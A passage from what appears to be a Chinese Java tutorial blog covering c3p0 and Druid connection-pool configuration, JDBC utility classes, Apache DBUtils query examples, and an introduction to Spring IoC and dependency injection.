class="line">    <span class="comment">&lt;!-- 连接池中保留的最小连接数，默认为：3--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minPoolSize&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 当连接池连接耗尽时，客户端调用getConnection()后等待获取新连接的时间，超时后将抛出SQLException，如设为0则无限期等待。单位毫秒。默认: 0 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;checkoutTimeout&quot;</span>&gt;</span>3000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--当连接池中的连接耗尽的时候c3p0一次同时获取的连接数。默认值: 3 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;acquireIncrement&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--定义在从数据库获取新连接失败后重复尝试的次数。默认值: 30 ；小于等于0表示无限次--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;acquireRetryAttempts&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--重新尝试的时间间隔，默认为：1000毫秒--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;acquireRetryDelay&quot;</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--关闭连接时，是否提交未提交的事务，默认为false，即关闭连接，回滚未提交的事务 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;autoCommitOnClose&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--c3p0将建一张名为Test的空表，并使用其自带的查询语句进行测试。如果定义了这个参数那么属性preferredTestQuery将被忽略。你不能在这张Test表上进行任何操作，它将只供c3p0测试使用。默认值: null --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;automaticTestTable&quot;</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--如果为false，则获取连接失败将会引起所有等待连接池来获取连接的线程抛出异常，但是数据源仍有效保留，并在下次调用getConnection()的时候继续尝试获取连接。如果设为true，那么在尝试获取连接失败后该数据源将申明已断开并永久关闭。默认: false--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;breakAfterAcquireFailure&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--每60秒检查所有连接池中的空闲连接。默认值: 0，不检查 --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;idleConnectionTestPeriod&quot;</span>&gt;</span>60<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--maxStatementsPerConnection定义了连接池内单个连接所拥有的最大缓存statements数。默认值: 0 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JDBC的标准参数，用以控制数据源内加载的PreparedStatements数量。但由于预缓存的statements 属于单个connection而不是整个连接池。所以设置这个参数需要考虑到多方面的因素。如果maxStatements与maxStatementsPerConnection均为0，则缓存被关闭。Default: 0--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxStatements&quot;</span>&gt;</span>200<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxStatementsPerConnection&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">named-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- This is my config for oracle --&gt;</span></span><br><span class="line"></span><br><span class="line">    -<span class="tag">&lt;<span class="name">named-config</span> <span class="attr">name</span>=<span class="string">&quot;oracle&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>oracle.jdbc.driver.OracleDriver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:oracle:thin:@localhost:1521:orcl<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>scott<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxIdleTime&quot;</span>&gt;</span>30<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxStatements&quot;</span>&gt;</span>200<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">named-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">c3p0-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>工具类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0Utils</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *使用ComboPooledDataSource来生成DataSource的实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DataSource dataSource = <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接池方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title">getDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从连接池中获取连接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource.getConnection();</span><br><span class="line">            <span class="comment">//1/10</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *释放连接回连接池</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">release</span><span class="params">(Connection conn, Statement stmt, ResultSet rs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            rs = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stmt != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            stmt = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            conn = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addEmp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection conn=<span class="keyword">null</span>;</span><br><span class="line">    PreparedStatement pstmt=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//从池子获取连接</span></span><br><span class="line">        conn= com.seehope.util.C3P0Utils.getConnection();</span><br><span class="line">        String sql=<span class="string">&quot;insert into emp(empno,ename) values(?,?)&quot;</span>;</span><br><span class="line">     <span class="comment">//必须在自定义的connection类中重写prepareStatement(sql)方法</span></span><br><span class="line">        pstmt=conn.prepareStatement(sql);</span><br><span class="line">        pstmt.setInt(<span class="number">1</span>,<span class="number">123</span>);</span><br><span class="line">        pstmt.setString(<span class="number">2</span>,<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> rows =pstmt.executeUpdate();</span><br><span class="line">        System.out.println(<span class="string">&quot;受影响的行数&quot;</span>+rows);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、Druid"><a href="#2、Druid" class="headerlink" title="2、Druid"></a>2、Druid</h3><p>导入druid-1.0.9.jar包</p>
<p>阿里巴巴</p>
<p><strong>配置文件properties</strong></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">driverClassName</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/emp</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">*******</span></span><br><span class="line"><span class="comment"># \u521D\u59CB\u5316\u8FDE\u63A5\u6570\u91CF</span></span><br><span class="line"><span class="attr">initialSize</span>=<span class="string">5</span></span><br><span class="line"><span class="comment"># \u6700\u5927\u8FDE\u63A5\u6570</span></span><br><span class="line"><span class="attr">maxActive</span>=<span class="string">10</span></span><br><span class="line"><span class="comment"># \u6700\u5927\u7B49\u5F85\u65F6\u95F4</span></span><br><span class="line"><span class="attr">maxWait</span>=<span class="string">3000</span></span><br></pre></td></tr></table></figure>

<p><strong>工具类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.seehope.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DruidUtils</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *     1.定义成员变量 DataSource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource ds ;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接池方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title">getDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  ds;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载配置文件</span></span><br><span class="line">            Properties pro = <span class="keyword">new</span> Properties();</span><br><span class="line">            InputStream in=DruidUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>);</span><br><span class="line">            pro.load(in);</span><br><span class="line">            <span class="comment">//2.获取DataSource</span></span><br><span class="line">            ds = DruidDataSourceFactory.createDataSource(pro);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="comment">//1/10</span></span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">        close(<span class="keyword">null</span>,stmt,conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(ResultSet rs , Statement stmt, Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();<span class="comment">//归还连接</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDruid</span> <span class="keyword">extends</span> <span class="title">DruidUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Connection conn=<span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement psmt=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn=getConnection();</span><br><span class="line">            String sql=<span class="string">&quot;insert into account(name,balance) values(?,?)&quot;</span>;</span><br><span class="line">            psmt=conn.prepareStatement(sql);</span><br><span class="line">            psmt.setString(<span class="number">1</span>,<span class="string">&quot;试试&quot;</span>);</span><br><span class="line">            psmt.setDouble(<span class="number">2</span>,<span class="number">3000</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> count=psmt.executeUpdate();</span><br><span class="line">            System.out.println(count);</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            DruidUtils.close(psmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、DButils"><a href="#3、DButils" class="headerlink" title="3、DButils"></a>3、DButils</h3><p>导入 commons-dbutils-1.4.jar</p>
<h4 id="（1）update"><a href="#（1）update" class="headerlink" title="（1）update"></a>（1）update</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">queryRunner.update(<span class="string">&quot;update book set name=?,price=?,category=?,pnum=?,imgurl=?,description=?,author=?,sales=? where id=?&quot;</span>, params);</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UButilDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        QueryRunner qr=<span class="keyword">new</span> QueryRunner(DruidUtils.getDataSource());</span><br><span class="line">        qr.update(<span class="string">&quot;insert into user values (?,?)&quot;</span>,<span class="string">&quot;alice&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testUpdate</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        QueryRunner qr=<span class="keyword">new</span> QueryRunner(C3P0Utils.getDataSource());</span><br><span class="line">        qr.update(<span class="string">&quot;update user set username=?,password=? where username=?&quot;</span>,<span class="string">&quot;rose&quot;</span>,<span class="string">&quot;111&quot;</span>,<span class="string">&quot;alice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        QueryRunner qr=<span class="keyword">new</span> QueryRunner(DruidUtils.getDataSource());</span><br><span class="line">        qr.update(<span class="string">&quot;delete from user where username=?&quot;</span>,<span class="string">&quot;rose&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testBatch</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        QueryRunner qr=<span class="keyword">new</span> QueryRunner(DruidUtils.getDataSource());</span><br><span class="line">        Object[][] params=<span class="keyword">new</span> Object[<span class="number">10</span>][];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;params.length; i++) &#123;</span><br><span class="line">            params[i]=<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;seehope&quot;</span>+i,<span class="string">&quot;123&quot;</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        qr.batch(<span class="string">&quot;insert into user(username,password) values(?,?)&quot;</span>,params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（2）query"><a href="#（2）query" class="headerlink" title="（2）query"></a>（2）query</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ScalarHandler:适合取单行单列数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    QueryRunner qr=<span class="keyword">new</span> QueryRunner(C3P0Utils.getDataSource());</span><br><span class="line">    Object o=qr.query(<span class="string">&quot;select count(*) from emp&quot;</span>,<span class="keyword">new</span> ScalarHandler(<span class="number">1</span>));</span><br><span class="line">    System.out.println(o.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * BeanHandler: 适合取单行数据，返回指定泛型对象类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    QueryRunner qr = <span class="keyword">new</span> QueryRunner(C3P0Utils.getDataSource());</span><br><span class="line">    Emp emp = qr.query(<span class="string">&quot;select *from emp where empno=?&quot;</span>, <span class="keyword">new</span> BeanHandler&lt;Emp&gt;(Emp.class), <span class="number">7369</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">    System.out.println(emp.getComm()+<span class="string">&quot;\t&quot;</span>+emp.getDeptno()+<span class="string">&quot;\t&quot;</span>+emp.getEmpno()+<span class="string">&quot;\t&quot;</span>+emp.getMgr());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * BeanListHandler: 返回泛型集合多行多列</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    QueryRunner qr = <span class="keyword">new</span> QueryRunner(C3P0Utils.getDataSource());</span><br><span class="line">    List&lt;Emp&gt; emp = qr.query(<span class="string">&quot;select *from emp&quot;</span>, <span class="keyword">new</span> BeanListHandler&lt;Emp&gt;(Emp.class));</span><br><span class="line">    System.out.println(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Emp e :emp)&#123;</span><br><span class="line">        System.out.println(e.getComm()+<span class="string">&quot;\t&quot;</span>+e.getDeptno()+<span class="string">&quot;\t&quot;</span>+e.getEmpno()+<span class="string">&quot;\t&quot;</span>+e.getMgr());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>jdbc</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring</title>
    <url>/2020/11/25/01spring/</url>
    <content><![CDATA[<h1 id="1、JavaBean规范以及javaBean类型"><a href="#1、JavaBean规范以及javaBean类型" class="headerlink" title="1、JavaBean规范以及javaBean类型"></a>1、JavaBean规范以及javaBean类型</h1><h2 id="JavaBean规范"><a href="#JavaBean规范" class="headerlink" title="JavaBean规范"></a>JavaBean规范</h2><ul>
<li>必须要有包</li>
<li>必须实现get/set方法</li>
<li>必须提供无参构造</li>
<li>必须实现序列化接口</li>
</ul>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><blockquote>
<p>序列化：是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。</p>
<p>​                序列化后的字节流保存了Java对象的状态以及相关的描述信息</p>
<p>反序列化：客户端从文件中或网络上获得序列化后的对象字节流后，</p>
<p>​                    根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。</p>
</blockquote>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><blockquote>
<p>简单无规则java对象(plian ordinary java object pojo)</p>
<ul>
<li>一个中间对象，可以转化为PO、DTO、VO</li>
</ul>
</blockquote>
<blockquote>
<p>PO持久化对象(persistent object)</p>
<ul>
<li>对应数据库中的entity</li>
</ul>
</blockquote>
<blockquote>
<p>接收请求对象BO(bussiness object)</p>
<ul>
<li>在前后端分离，http响应json格式封装的数据对象</li>
</ul>
</blockquote>
<blockquote>
<p>返回响应VO(value object)</p>
<ul>
<li>封装渲染前端view的数据对象</li>
</ul>
</blockquote>
<blockquote>
<p>数据传输对象(data transfer object)</p>
<ul>
<li>返回的数据库操作对象 (count(*) )</li>
</ul>
</blockquote>
<a id="more"></a>

<h1 id="2、简介"><a href="#2、简介" class="headerlink" title="2、简介"></a>2、简介</h1><p>Spring 是分层的 Java SE/EE 应用 full-stack 轻量级开源框架，以 <strong>IoC</strong>（Inverse Of Control： 反转控制）和 <strong>AOP</strong>（Aspect Oriented Programming：面向切面编程）为内核，提供了展现层 Spring MVC 和持久层 Spring JDBC 以及业务层事务管理等众多的企业级应用技术，还能整合开源世界众多 著名的第三方框架和类库，</p>
<p><strong>工厂模式解耦</strong></p>
<p>将MVC三层的对象都使用配置文件配置起来，当启动服务器应用加载的时候，让类中通过读取配置文件，把这些对象创建出来并存起来</p>
<p>这个读取配置文件，创建和获取三层对象的类就是工厂</p>
<h1 id="3、IOC"><a href="#3、IOC" class="headerlink" title="3、IOC"></a>3、IOC</h1><h2 id="IOC原理"><a href="#IOC原理" class="headerlink" title="IOC原理"></a>IOC原理</h2><blockquote>
<p>Spring提供的容器又称为IOC容器</p>
<p>IOC-inversion of Control-控制反转</p>
</blockquote>
<h3 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a><strong>传统方式</strong></h3><blockquote>
<p>创建实例需要<code>new</code>,存在实例化麻烦的问题，且多个Service可能创建多个相同实例</p>
<p>组件由应用程序自身创建和配置</p>
</blockquote>
<p>系统在没有引入IOC容器之前，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。</p>
<p> IoC 容器实际上就是个<code>Map（key，value）</code>,<code>Map</code>中存放的是各种对象。</p>
<h3 id="IOC模式"><a href="#IOC模式" class="headerlink" title="IOC模式"></a><strong>IOC模式</strong></h3><blockquote>
<p>控制权发生了反转，从应用程序转移到Ioc容器。</p>
<p>为了让组件在IOC容器中被”装配”出来，需要某种”注入”机制</p>
</blockquote>
<p>由于IOC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方。</p>
<h3 id="DI"><a href="#DI" class="headerlink" title="DI"></a><strong>DI</strong></h3><blockquote>
<p>DI-dependecy Injection-依赖注入</p>
<ul>
<li>将组件的创建+配置 与组件的使用分离</li>
<li>由IOC容器负责管理组件的生命周期</li>
</ul>
</blockquote>
<p>DI即Dependency Injection，是控制反转的一种实现方式。控制被反转之后，获得依赖对象的过程由自身管理变为了由IOC容器主动注入所谓依赖注入，就是由IOC容器在运行期间，动态地将某种依赖关系注入到对象之中。</p>
